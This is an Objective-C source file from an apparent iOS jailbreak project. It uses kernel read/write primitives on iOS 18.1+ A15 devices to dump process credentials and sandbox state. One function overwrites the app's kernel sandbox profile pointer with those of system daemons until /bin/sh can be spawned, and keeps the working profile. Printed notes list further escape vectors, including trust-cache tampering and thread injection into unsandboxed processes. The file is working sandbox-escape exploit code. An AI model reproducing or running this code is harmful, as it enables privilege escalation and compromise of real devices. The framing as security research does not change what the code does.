//
//  kernel_research.m
//  ClaudeFiles
//
//  Kernel research toolkit for SPTM bypass investigation on iOS 18.1+ A15.
//  Uses existing kread/kwrite primitives to map kernel state and test
//  indirect bypass vectors that avoid PPL/SPTM-protected memory.
//

#import "kernel_research.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"
#import "research/sandbox_research.h"
#import <stdlib.h>
#import <string.h>
#import <stdio.h>
#import <unistd.h>
#import <spawn.h>
#import <sys/wait.h>
#import <sys/stat.h>
#import <errno.h>

// sandbox_check is private API
extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
#define SANDBOX_FILTER_PATH          (1 << 0)
#define SANDBOX_CHECK_NO_REPORT      (1 << 9)
#define SANDBOX_FILTER_GLOBAL_NAME   (1 << 1)
#define SANDBOX_FILTER_NONE          0

// ── Helpers ──

static char *g_buf = NULL;
static size_t g_buf_len = 0;
static size_t g_buf_cap = 0;

static void buf_init(void) {
    g_buf_cap = 8192;
    g_buf = (char *)malloc(g_buf_cap);
    g_buf[0] = '\0';
    g_buf_len = 0;
}

static void buf_append(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    char line[1024];
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);

    size_t line_len = strlen(line);
    if (g_buf_len + line_len + 1 > g_buf_cap) {
        g_buf_cap = (g_buf_len + line_len + 1) * 2;
        g_buf = (char *)realloc(g_buf, g_buf_cap);
    }
    memcpy(g_buf + g_buf_len, line, line_len + 1);
    g_buf_len += line_len;
}

static char *buf_finish(void) {
    char *result = g_buf;
    g_buf = NULL;
    g_buf_len = 0;
    g_buf_cap = 0;
    return result;
}

static bool kaddr_ok(uint64_t addr) {
    return (addr >= VM_MIN_KERNEL_ADDRESS && addr <= VM_MAX_KERNEL_ADDRESS);
}

static void hexdump_buf(uint64_t kaddr, size_t len, const char *label) {
    buf_append("  %s @ 0x%llx (%zu bytes):\n", label, kaddr, len);
    uint8_t data[256];
    if (len > sizeof(data)) len = sizeof(data);
    kreadbuf(kaddr, data, len);
    for (size_t i = 0; i < len; i += 16) {
        buf_append("    %04zx: ", i);
        for (size_t j = 0; j < 16 && (i + j) < len; j++) {
            buf_append("%02x ", data[i + j]);
        }
        buf_append("\n");
    }
}

// Read a kernel C string (up to maxlen bytes)
static void kread_string(uint64_t kaddr, char *out, size_t maxlen) {
    if (!kaddr_ok(kaddr)) {
        snprintf(out, maxlen, "(invalid kaddr 0x%llx)", kaddr);
        return;
    }
    kreadbuf(kaddr, out, maxlen - 1);
    out[maxlen - 1] = '\0';
}

// ── Credential dumping ──

typedef struct {
    uint64_t proc;
    uint64_t proc_ro;
    uint64_t ucred;
    uint64_t task;
    uint64_t label;
    uint64_t sandbox;
    uint64_t sandbox_profile;
    uint64_t extension_set;
    uint32_t uid, ruid, svuid;
    uint32_t gid, rgid, svgid;
    uint32_t p_flag;
    uint32_t cs_flags;  // from csblob if accessible
    char p_name[32];
    pid_t pid;
} proc_info_t;

static int gather_proc_info(uint64_t proc, proc_info_t *info) {
    memset(info, 0, sizeof(*info));
    info->proc = proc;

    if (!proc || !kaddr_ok(proc)) return -1;

    info->pid = (pid_t)kread32(proc + off_proc_p_pid);
    kreadbuf(proc + off_proc_p_name, info->p_name, 31);
    info->p_flag = kread32(proc + off_proc_p_flag);

    // proc_ro
    info->proc_ro = kread_ptr(proc + off_proc_p_proc_ro);
    if (!kaddr_ok(info->proc_ro)) return -1;

    // task
    info->task = kread_ptr(info->proc_ro + off_proc_ro_pr_task);

    // ucred (PPL-protected, but we can READ)
    info->ucred = kread_ptr(info->proc_ro + off_proc_ro_p_ucred);
    if (!kaddr_ok(info->ucred)) return -1;

    // Read credential fields
    info->uid   = kread32(info->ucred + 0x18);  // cr_uid
    info->ruid  = kread32(info->ucred + 0x1c);  // cr_ruid
    info->svuid = kread32(info->ucred + 0x20);  // cr_svuid
    info->rgid  = kread32(info->ucred + 0x68);  // cr_rgid
    info->svgid = kread32(info->ucred + 0x6c);  // cr_svgid

    // Label → sandbox
    info->label = kread_ptr(info->ucred + off_ucred_cr_label);
    if (kaddr_ok(info->label)) {
        info->sandbox = kread_ptr(info->label + off_label_l_perpolicy_sandbox);
        if (kaddr_ok(info->sandbox)) {
            // sandbox_label layout (verified against sandbox_escape.m):
            //   0x00: profile/platform_profile
            //   0x08: unknown (often 0)
            //   0x10: extension_set  (OFF_SANDBOX_EXT_SET in sandbox_escape.m)
            //   0x18: unknown
            info->sandbox_profile = kread_ptr(info->sandbox + 0x00);
            info->extension_set = kread_ptr(info->sandbox + 0x10);  // was 0x08, WRONG
        }
    }

    // Try to read cs_flags from csblob chain
    uint64_t textvp = kread_ptr(proc + off_proc_p_textvp);
    if (kaddr_ok(textvp)) {
        uint64_t ubcinfo = kread_ptr(textvp + 0x78);
        if (kaddr_ok(ubcinfo)) {
            uint64_t csblob = kread_ptr(ubcinfo + 0x50);
            if (kaddr_ok(csblob)) {
                info->cs_flags = kread32(csblob + 0xC);
            }
        }
    }

    return 0;
}

static void dump_proc_info(proc_info_t *info) {
    buf_append("  PID: %d  Name: %s\n", info->pid, info->p_name);
    buf_append("  proc:     0x%llx\n", info->proc);
    buf_append("  proc_ro:  0x%llx  (PPL-protected)\n", info->proc_ro);
    buf_append("  task:     0x%llx\n", info->task);
    buf_append("  ucred:    0x%llx  (PPL-protected)\n", info->ucred);
    buf_append("  UID: %u  RUID: %u  SVUID: %u\n", info->uid, info->ruid, info->svuid);
    buf_append("  RGID: %u  SVGID: %u\n", info->rgid, info->svgid);
    buf_append("  p_flag:   0x%08x", info->p_flag);
    if (info->p_flag & 0x400) buf_append(" [P_PLATFORM]");
    buf_append("\n");
    buf_append("  cs_flags: 0x%08x", info->cs_flags);
    if (info->cs_flags & 0x1)       buf_append(" [CS_VALID]");
    if (info->cs_flags & 0x4)       buf_append(" [CS_GET_TASK_ALLOW]");
    if (info->cs_flags & 0x8)       buf_append(" [CS_INSTALLER]");
    if (info->cs_flags & 0x20000)   buf_append(" [CS_SIGNED]");
    if (info->cs_flags & 0x4000000) buf_append(" [CS_PLATFORM_BINARY]");
    buf_append("\n");
    buf_append("  label:    0x%llx\n", info->label);
    buf_append("  sandbox:  0x%llx\n", info->sandbox);
    buf_append("  profile:  0x%llx  (sandbox profile ptr — in WRITABLE memory)\n", info->sandbox_profile);
    buf_append("  ext_set:  0x%llx  (extension set — in WRITABLE memory)\n", info->extension_set);
}

// ── Public API ──

char *kresearch_dump_self(void) {
    buf_init();
    buf_append("=== SELF PROCESS STATE ===\n");

    uint64_t self_proc = proc_self();
    proc_info_t info;
    if (gather_proc_info(self_proc, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info\n");
        return buf_finish();
    }
    dump_proc_info(&info);

    // Dump raw sandbox_label
    if (kaddr_ok(info.sandbox)) {
        hexdump_buf(info.sandbox, 0x40, "sandbox_label raw");
    }

    // Dump extension_set buckets
    if (kaddr_ok(info.extension_set)) {
        buf_append("\n  Extension set buckets:\n");
        for (int i = 0; i < 9; i++) {
            uint64_t bucket = kread_ptr(info.extension_set + (i * 8));
            if (bucket && kaddr_ok(bucket)) {
                // Read class node fields using raw kread (avoids pointer cast issues)
                uint64_t class_name_ptr = kread_ptr(bucket + 0x00);
                uint64_t node_count     = kread64(bucket + 0x18);
                char name[128] = {0};
                if (kaddr_ok(class_name_ptr)) {
                    kreadbuf(class_name_ptr, name, sizeof(name) - 1);
                }
                buf_append("    [%d] 0x%llx -> class: \"%s\" (count: %llu)\n",
                           i, bucket, name, (unsigned long long)node_count);
            }
        }
    }

    return buf_finish();
}

char *kresearch_dump_proc(int pid) {
    buf_init();
    buf_append("=== PROCESS %d STATE ===\n", pid);

    uint64_t target = proc_find((pid_t)pid);
    if (!target || !kaddr_ok(target)) {
        buf_append("ERROR: Could not find proc for PID %d\n", pid);
        return buf_finish();
    }

    proc_info_t info;
    if (gather_proc_info(target, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info for PID %d\n", pid);
        return buf_finish();
    }
    dump_proc_info(&info);

    return buf_finish();
}

char *kresearch_compare_creds(int target_pid) {
    buf_init();
    buf_append("=== CREDENTIAL COMPARISON: self vs PID %d ===\n\n", target_pid);

    // Gather self
    proc_info_t self_info;
    if (gather_proc_info(proc_self(), &self_info) != 0) {
        buf_append("ERROR: Failed to gather self proc info\n");
        return buf_finish();
    }

    // Gather target
    uint64_t target_proc = proc_find((pid_t)target_pid);
    if (!target_proc || !kaddr_ok(target_proc)) {
        buf_append("ERROR: Could not find PID %d\n", target_pid);
        return buf_finish();
    }
    proc_info_t target_info;
    if (gather_proc_info(target_proc, &target_info) != 0) {
        buf_append("ERROR: Failed to gather target proc info\n");
        return buf_finish();
    }

    buf_append("--- SELF (PID %d, %s) ---\n", self_info.pid, self_info.p_name);
    dump_proc_info(&self_info);
    buf_append("\n--- TARGET (PID %d, %s) ---\n", target_info.pid, target_info.p_name);
    dump_proc_info(&target_info);

    buf_append("\n--- KEY DIFFERENCES ---\n");

    if (self_info.uid != target_info.uid)
        buf_append("  UID: self=%u target=%u  ← PPL-protected, cannot change\n",
                   self_info.uid, target_info.uid);

    if (self_info.p_flag != target_info.p_flag)
        buf_append("  p_flag: self=0x%x target=0x%x  ← WRITABLE (in proc, not proc_ro)\n",
                   self_info.p_flag, target_info.p_flag);

    if (self_info.cs_flags != target_info.cs_flags)
        buf_append("  cs_flags: self=0x%x target=0x%x  ← in csblob, may be PPL-protected\n",
                   self_info.cs_flags, target_info.cs_flags);

    if (self_info.sandbox_profile != target_info.sandbox_profile)
        buf_append("  sandbox_profile: self=0x%llx target=0x%llx  ← WRITABLE (in sandbox_label)\n",
                   self_info.sandbox_profile, target_info.sandbox_profile);

    if (self_info.extension_set != target_info.extension_set)
        buf_append("  extension_set: self=0x%llx target=0x%llx  ← WRITABLE\n",
                   self_info.extension_set, target_info.extension_set);

    // Check if sandbox objects are the same pointer (some daemons share)
    if (self_info.sandbox == 0 && target_info.sandbox == 0)
        buf_append("  NOTE: Both have NULL sandbox — no sandbox applied\n");
    else if (target_info.sandbox == 0)
        buf_append("  NOTE: Target has NO sandbox! We do.\n");

    return buf_finish();
}

char *kresearch_check_sandbox_ops(void) {
    buf_init();
    buf_append("=== SANDBOX OPERATION CHECK ===\n");
    pid_t pid = getpid();
    buf_append("PID: %d\n\n", pid);

    struct {
        const char *op;
        int filter;
        const char *arg;
        const char *category;
    } checks[] = {
        // Filesystem (should be allowed after sandbox escape)
        {"file-read-data",    SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/bin/sh",     "filesystem"},

        // Process operations (likely blocked — key for posix_spawn)
        {"process-exec",      SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-exec",      SANDBOX_FILTER_PATH, "/usr/bin/env", "process"},
        {"process-exec*",     SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-fork",      SANDBOX_FILTER_NONE, NULL,          "process"},

        // Mach/IPC
        {"mach-lookup",       SANDBOX_FILTER_NONE, NULL,          "mach"},

        // Signal
        {"signal",            SANDBOX_FILTER_NONE, NULL,          "signal"},

        // Sysctl
        {"sysctl-read",       SANDBOX_FILTER_NONE, NULL,          "sysctl"},
        {"sysctl-write",      SANDBOX_FILTER_NONE, NULL,          "sysctl"},
    };

    int n = sizeof(checks) / sizeof(checks[0]);
    for (int i = 0; i < n; i++) {
        int result;
        if (checks[i].arg) {
            result = sandbox_check(pid, checks[i].op,
                                   checks[i].filter | SANDBOX_CHECK_NO_REPORT,
                                   checks[i].arg);
        } else {
            result = sandbox_check(pid, checks[i].op,
                                   SANDBOX_CHECK_NO_REPORT);
        }

        const char *status = (result == 0) ? "ALLOWED" : "BLOCKED";
        if (checks[i].arg) {
            buf_append("  [%s] %-7s  %s %s\n", status,
                       checks[i].category, checks[i].op, checks[i].arg);
        } else {
            buf_append("  [%s] %-7s  %s\n", status,
                       checks[i].category, checks[i].op);
        }
    }

    buf_append("\nNOTE: 'process-exec' and 'process-fork' are the key checks for posix_spawn.\n");
    buf_append("If blocked, we need to either:\n");
    buf_append("  1. Swap sandbox profile pointer (writable in sandbox_label)\n");
    buf_append("  2. Add process-exec extensions (like we do for file-read-write)\n");
    buf_append("  3. Clear/modify sandbox_label.platform_profile\n");

    return buf_finish();
}

char *kresearch_dump_sandbox_profile(void) {
    buf_init();
    buf_append("=== SANDBOX PROFILE ANALYSIS ===\n\n");

    // Our sandbox
    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    buf_append("--- OUR SANDBOX ---\n");
    if (!kaddr_ok(self_info.sandbox)) {
        buf_append("  No sandbox object found!\n");
        return buf_finish();
    }

    hexdump_buf(self_info.sandbox, 0x80, "sandbox_label full dump");

    buf_append("\n  Profile pointer: 0x%llx\n", self_info.sandbox_profile);
    if (kaddr_ok(self_info.sandbox_profile)) {
        hexdump_buf(self_info.sandbox_profile, 0x40, "profile object (first 64 bytes)");

        // Try to read profile name/type if it has one
        // Sandbox profiles typically have a name string pointer near the start
        uint64_t maybe_name = kread_ptr(self_info.sandbox_profile);
        if (kaddr_ok(maybe_name)) {
            char name[128] = {0};
            kreadbuf(maybe_name, name, sizeof(name) - 1);
            // Check if it looks like ASCII
            bool is_ascii = true;
            for (int i = 0; i < 64 && name[i]; i++) {
                if (name[i] < 0x20 || name[i] > 0x7e) { is_ascii = false; break; }
            }
            if (is_ascii && name[0])
                buf_append("  Profile name (maybe): \"%s\"\n", name);
        }
    }

    // Compare with launchd (PID 1)
    uint64_t launchd_proc = proc_find(1);
    if (kaddr_ok(launchd_proc)) {
        proc_info_t launchd_info;
        gather_proc_info(launchd_proc, &launchd_info);

        buf_append("\n--- LAUNCHD (PID 1) SANDBOX ---\n");
        if (kaddr_ok(launchd_info.sandbox)) {
            hexdump_buf(launchd_info.sandbox, 0x80, "launchd sandbox_label");
            buf_append("  Profile pointer: 0x%llx\n", launchd_info.sandbox_profile);
        } else {
            buf_append("  launchd sandbox ptr: 0x%llx (NULL/invalid → NO sandbox!)\n",
                       launchd_info.sandbox);
        }

        if (self_info.sandbox_profile == launchd_info.sandbox_profile) {
            buf_append("\n  SAME profile pointer — profiles already match\n");
        } else {
            buf_append("\n  DIFFERENT profile pointers:\n");
            buf_append("    self:    0x%llx\n", self_info.sandbox_profile);
            buf_append("    launchd: 0x%llx\n", launchd_info.sandbox_profile);
            buf_append("    → Swapping could unlock process-exec\n");
        }
    }

    // Also check a few system daemons
    const char *daemons[] = {"SpringBoard", "backboardd", "logd", NULL};
    for (int i = 0; daemons[i]; i++) {
        uint64_t dp = proc_find_by_name(daemons[i]);
        if (dp && kaddr_ok(dp)) {
            proc_info_t di;
            gather_proc_info(dp, &di);
            buf_append("\n  %s (PID %d): sandbox=0x%llx profile=0x%llx uid=%u\n",
                       daemons[i], di.pid, di.sandbox, di.sandbox_profile, di.uid);
        }
    }

    return buf_finish();
}

char *kresearch_swap_sandbox_profile(void) {
    buf_init();
    buf_append("=== SANDBOX PROFILE SWAP v8 ===\n");
    buf_append("(v7: fork+exec both EPERM. Extensions don't cover process ops.\n");
    buf_append(" v8: Swap profile pointer to daemon profiles that allow exec.\n");
    buf_append(" sandbox_label is WRITABLE - kwrite64 to sandbox+0x00 is safe.)\n\n");

    // ── Step 1: Chain walk ──
    fprintf(stderr, "[SWAP] Step 1: chain walk\n");
    uint64_t self_proc = proc_self();
    if (!self_proc || !is_kaddr_valid(self_proc)) {
        buf_append("ERROR: proc_self() invalid\n");
        return buf_finish();
    }
    pid_t our_pid = (pid_t)kread32(self_proc + off_proc_p_pid);
    buf_append("PID=%d proc=0x%llx\n", our_pid, self_proc);

    uint64_t proc_ro = kread_ptr(self_proc + off_proc_p_proc_ro);
    uint64_t ucred = (proc_ro && is_kaddr_valid(proc_ro))
        ? kread_ptr(proc_ro + off_proc_ro_p_ucred) : 0;
    uint64_t label = (ucred && is_kaddr_valid(ucred))
        ? kread_ptr(ucred + off_ucred_cr_label) : 0;
    uint64_t sandbox = (label && is_kaddr_valid(label))
        ? kread_ptr(label + off_label_l_perpolicy_sandbox) : 0;

    if (!sandbox || sandbox == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(sandbox)) {
        buf_append("ERROR: sandbox chain broken\n");
        return buf_finish();
    }

    uint64_t our_profile = kread64(sandbox + 0x00);
    buf_append("sandbox=0x%llx our_profile=0x%llx\n\n", sandbox, our_profile);

    // ── Step 2: Baseline posix_spawn (confirm still blocked) ──
    fprintf(stderr, "[SWAP] Step 2: baseline\n");
    {
        pid_t child = 0;
        char *argv[] = {"/bin/sh", "-c", "echo ok", NULL};
        char *envp[] = {"PATH=/usr/bin:/bin", NULL};
        int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
        buf_append("Baseline posix_spawn: %d (%s)\n",
                   ret, ret == 0 ? "SUCCESS" : strerror(ret));
        if (ret == 0) {
            buf_append("*** ALREADY WORKS! PID=%d ***\n", child);
            waitpid(child, NULL, 0);
            return buf_finish();
        }
    }

    // ══════════════════════════════════════════════════════════════
    // Step 3: Collect daemon profiles to try
    //
    // Strategy: scan running daemons, collect unique profile pointers.
    // Daemons like configd, runningboardd, logd need fork/exec to work.
    // We swap our profile pointer to theirs and test fork+spawn.
    //
    // sandbox_label+0x00 (profile ptr) is in WRITABLE memory.
    // Writing a valid profile pointer is safe - concurrent sandbox
    // evaluations will use the new profile (no NULL deref risk).
    // ══════════════════════════════════════════════════════════════
    fprintf(stderr, "[SWAP] Step 3: collect daemon profiles\n");

    typedef struct {
        uint64_t profile;
        pid_t pid;
        char name[20];
    } daemon_profile_t;

    daemon_profile_t candidates[20];
    int n_candidates = 0;

    // Scan PIDs 1-300 for sandboxed daemons with DIFFERENT profiles
    for (pid_t scan = 1; scan <= 300 && n_candidates < 20; scan++) {
        uint64_t p = proc_find(scan);
        if (!p || !is_kaddr_valid(p)) continue;

        uint64_t p_pro = kread_ptr(p + off_proc_p_proc_ro);
        if (!p_pro || !is_kaddr_valid(p_pro)) continue;
        uint64_t p_uc = kread_ptr(p_pro + off_proc_ro_p_ucred);
        if (!p_uc || !is_kaddr_valid(p_uc)) continue;
        uint64_t p_lab = kread_ptr(p_uc + off_ucred_cr_label);
        if (!p_lab || !is_kaddr_valid(p_lab)) continue;
        uint64_t p_sb = kread_ptr(p_lab + off_label_l_perpolicy_sandbox);

        if (!p_sb || p_sb == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(p_sb))
            continue;

        uint64_t p_prof = kread64(p_sb + 0x00);
        if (!p_prof || !is_kaddr_valid(p_prof)) continue;

        // Skip if same as our profile
        if (p_prof == our_profile) continue;

        // Skip if we already have this profile pointer
        bool dup = false;
        for (int i = 0; i < n_candidates; i++) {
            if (candidates[i].profile == p_prof) { dup = true; break; }
        }
        if (dup) continue;

        candidates[n_candidates].profile = p_prof;
        candidates[n_candidates].pid = scan;
        kreadbuf(p + off_proc_p_name, candidates[n_candidates].name, 19);
        candidates[n_candidates].name[19] = '\0';
        n_candidates++;
    }

    buf_append("Found %d unique daemon profiles (excluding ours):\n", n_candidates);
    for (int i = 0; i < n_candidates; i++) {
        buf_append("  [%d] PID %d %-16s prof=0x%llx\n",
                   i, candidates[i].pid, candidates[i].name,
                   (unsigned long long)candidates[i].profile);
    }

    // ══════════════════════════════════════════════════════════════
    // Step 4: Try each daemon's profile
    //
    // For each candidate:
    //   1. Write daemon's profile ptr to our sandbox+0x00
    //   2. Try fork()
    //   3. Try posix_spawn()
    //   4. Restore our profile ptr
    //
    // Window between write and restore: concurrent threads will have
    // the daemon's profile applied. This may deny some file ops that
    // the daemon's profile doesn't allow, but won't crash (valid ptr).
    // ══════════════════════════════════════════════════════════════
    fprintf(stderr, "[SWAP] Step 4: profile swap tests\n");
    buf_append("\n-- Profile swap tests --\n");

    bool success = false;
    for (int i = 0; i < n_candidates && !success; i++) {
        fprintf(stderr, "[SWAP] Trying %s (PID %d)\n",
                candidates[i].name, candidates[i].pid);
        buf_append("\n  [%d] %s (PID %d) prof=0x%llx\n",
                   i, candidates[i].name, candidates[i].pid,
                   (unsigned long long)candidates[i].profile);

        // Write daemon's profile pointer to our sandbox_label
        kwrite64(sandbox + 0x00, candidates[i].profile);

        // Verify write
        uint64_t rb = kread64(sandbox + 0x00);
        buf_append("  Profile swapped. Readback=0x%llx %s\n",
                   rb, (rb == candidates[i].profile) ? "OK" : "MISMATCH");

        if (rb != candidates[i].profile) {
            buf_append("  WRITE FAILED - sandbox+0x00 may be protected!\n");
            // Restore immediately and stop trying
            kwrite64(sandbox + 0x00, our_profile);
            buf_append("  *** sandbox_label+0x00 NOT writable. Cannot swap. ***\n");
            break;
        }

        // Test fork
        int fork_ok = 0;
        pid_t fpid = fork();
        if (fpid == 0) {
            _exit(42);
        } else if (fpid > 0) {
            fork_ok = 1;
            int status = 0;
            waitpid(fpid, &status, 0);
            buf_append("  fork: OK (child=%d exit=%d)\n", fpid,
                       WIFEXITED(status) ? WEXITSTATUS(status) : -1);
        } else {
            buf_append("  fork: FAILED (%d %s)\n", errno, strerror(errno));
        }

        // Test posix_spawn
        {
            pid_t child = 0;
            char *argv[] = {"/bin/sh", "-c", "echo spawn_ok && id", NULL};
            char *envp[] = {"PATH=/usr/bin:/bin", NULL};
            int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
            if (ret == 0) {
                buf_append("  posix_spawn: SUCCESS! PID=%d\n", child);
                int status = 0;
                waitpid(child, &status, 0);
                buf_append("  exit=%d\n",
                           WIFEXITED(status) ? WEXITSTATUS(status) : -1);
                buf_append("\n  *** EXEC UNLOCKED with %s profile! ***\n",
                           candidates[i].name);
                success = true;
                // DON'T restore - keep the working profile!
            } else {
                buf_append("  posix_spawn: %d (%s)\n", ret, strerror(ret));
            }
        }

        // Restore if this candidate didn't work
        if (!success) {
            kwrite64(sandbox + 0x00, our_profile);
            // Verify restore
            uint64_t restore_rb = kread64(sandbox + 0x00);
            buf_append("  Restored (rb=0x%llx)\n",
                       (unsigned long long)restore_rb);
        }
    }

    if (!success) {
        buf_append("\n-- All profile swaps failed --\n");
        buf_append("fork+exec blocked even with daemon profiles.\n");
        buf_append("Block is ABOVE sandbox layer (AMFI/TXM/codesigning).\n");
        buf_append("\nNext vectors to investigate:\n");
        buf_append("  1. cs_flags in csblob (CS_PLATFORM_BINARY etc)\n");
        buf_append("  2. AMFI trust cache entries\n");
        buf_append("  3. proc_ro->p_csflags if writable via zone element\n");
        buf_append("  4. task_for_pid + thread injection into unsandboxed proc\n");
    }

    return buf_finish();
}

char *kresearch_add_exec_extension(void) {
    buf_init();
    buf_append("=== ADD PROCESS-EXEC EXTENSION (EXPERIMENTAL) ===\n\n");
    buf_append("NOTE: Sandbox extensions are class-based. Process-exec may not\n");
    buf_append("use the extension mechanism. Testing anyway...\n\n");

    // This is speculative — the sandbox may not check extensions for process-exec.
    // The filesystem escape works because file-read/write-data operations check
    // the extension set. Process operations might be profile-only.

    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    if (!kaddr_ok(self_info.extension_set)) {
        buf_append("ERROR: No extension set found\n");
        return buf_finish();
    }

    buf_append("Extension set at: 0x%llx\n", self_info.extension_set);

    // Check current sandbox state for process-exec
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    buf_append("Current process-exec status: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");

    if (exec_check == 0) {
        buf_append("Already allowed — nothing to do!\n");
        return buf_finish();
    }

    // Enumerate all extension buckets to understand the structure
    buf_append("\nCurrent extension buckets:\n");
    for (int i = 0; i < 9; i++) {
        uint64_t bucket = kread_ptr(self_info.extension_set + (i * 8));
        if (bucket && kaddr_ok(bucket)) {
            struct extension_class_node node = {0};
            kreadbuf(bucket, &node, sizeof(node));
            char name[128] = {0};
            if (kaddr_ok((uint64_t)node.class_name)) {
                kreadbuf((uint64_t)node.class_name, name, sizeof(name) - 1);
            }
            buf_append("  bucket[%d]: 0x%llx class=\"%s\" count=%llu\n",
                       i, bucket, name, (unsigned long long)node.count);

            // Walk extension list
            uint64_t ext = (uint64_t)node.ext_list_head;
            int j = 0;
            while (ext && kaddr_ok(ext) && j < 5) {
                struct extension e = {0};
                kreadbuf(ext, &e, sizeof(e));
                char path[128] = {0};
                if (kaddr_ok((uint64_t)e.data_ptr)) {
                    kreadbuf((uint64_t)e.data_ptr, path, sizeof(path) - 1);
                }
                buf_append("    ext: path=\"%s\" pathlen=%llu sc=%d\n",
                           path, (unsigned long long)e.path_len, e.file.storage_class);
                ext = (uint64_t)e.next;
                j++;
            }
        }
    }

    buf_append("\nTo add a process-exec extension, we would need to create a new\n");
    buf_append("extension_class_node for 'com.apple.sandbox.executable' and link it\n");
    buf_append("into the extension set. However, this requires allocating kernel memory\n");
    buf_append("for the new structures, which is complex with only kwrite.\n");
    buf_append("\nRecommendation: Try sandbox profile swap first (kresearch swap_profile).\n");

    return buf_finish();
}

char *kresearch_test_spawn(void) {
    buf_init();
    buf_append("=== POSIX_SPAWN TEST ===\n\n");

    // Check sandbox state
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    int fork_check = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
    buf_append("sandbox process-exec /bin/sh: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");
    buf_append("sandbox process-fork: %s\n",
               fork_check == 0 ? "ALLOWED" : "BLOCKED");

    // Check our credentials
    buf_append("getuid()=%d geteuid()=%d\n", getuid(), geteuid());

    // Try posix_spawn with different binaries
    const char *binaries[] = {"/bin/sh", "/bin/echo", "/usr/bin/id", NULL};
    for (int i = 0; binaries[i]; i++) {
        buf_append("\nTrying posix_spawn(%s):\n", binaries[i]);

        pid_t child = 0;
        char *argv[] = {(char *)binaries[i], NULL};
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            char *sh_argv[] = {"/bin/sh", "-c", "echo spawn_ok", NULL};
            argv[0] = sh_argv[0];
            // Can't reassign fixed array, do it inline
        }
        char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};

        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);

        char *spawn_argv[4];
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            spawn_argv[0] = "/bin/sh";
            spawn_argv[1] = "-c";
            spawn_argv[2] = "echo spawn_ok";
            spawn_argv[3] = NULL;
        } else {
            spawn_argv[0] = (char *)binaries[i];
            spawn_argv[1] = NULL;
        }

        int ret = posix_spawn(&child, binaries[i], NULL, &attr, spawn_argv, envp);
        posix_spawnattr_destroy(&attr);

        if (ret == 0) {
            buf_append("  SUCCESS! PID=%d\n", child);
            int status = 0;
            waitpid(child, &status, 0);
            int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
            buf_append("  Exit code: %d\n", exit_code);
        } else {
            buf_append("  FAILED: %d (%s)\n", ret, strerror(ret));
            // Decode specific errno
            switch (ret) {
                case EPERM:
                    buf_append("  → EPERM: Operation not permitted (credential/sandbox issue)\n");
                    break;
                case ENOENT:
                    buf_append("  → ENOENT: Binary not found at path\n");
                    break;
                case EACCES:
                    buf_append("  → EACCES: Permission denied (filesystem access)\n");
                    break;
                case ENOEXEC:
                    buf_append("  → ENOEXEC: Not executable (code signing?)\n");
                    break;
                default:
                    break;
            }
        }
    }

    return buf_finish();
}
